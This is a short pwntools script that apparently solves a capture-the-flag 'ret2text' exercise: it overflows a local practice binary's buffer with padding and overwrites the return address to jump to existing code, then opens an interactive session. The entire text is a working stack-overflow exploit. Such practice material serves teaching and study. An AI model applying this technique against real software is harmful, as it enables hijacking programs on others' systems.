##!/usr/bin/env python
from pwn import *

sh = process('./ret2text_bin')
target = 0x804863a
sh.sendline(b'A' * (0x6c+4) + p32(target))
sh.recvuntil('Maybe I will tell you next time !')
sh.interactive()